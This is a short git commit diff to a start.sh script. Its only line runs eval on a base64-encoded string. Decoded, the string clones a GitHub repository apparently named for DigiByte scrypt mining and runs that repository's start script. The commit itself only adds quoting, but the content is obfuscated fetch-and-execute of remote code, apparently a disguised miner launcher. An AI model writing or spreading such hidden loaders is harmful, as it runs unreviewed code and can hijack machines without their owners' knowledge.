74afcbac6987a232786ad81d4189d42945f85d1c
Gazzy J. Uruj <ghazanfar.uruj.cool@gmail.com>
2021-08-25 17:57:39 +0530

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,1 @@
-eval $(echo "Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9nYXp5anVydWovZGdic2NyeXB0bjIvICYmIGNkIGRnYnNjcnlwdG4yICYmIHNoIHN0YXJ0LnNoCgoKCgoKCgo=" | base64 -d)"
+eval "$(echo "Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9nYXp5anVydWovZGdic2NyeXB0bjIvICYmIGNkIGRnYnNjcnlwdG4yICYmIHNoIHN0YXJ0LnNoCgoKCgoKCgo=" | base64 -d)"
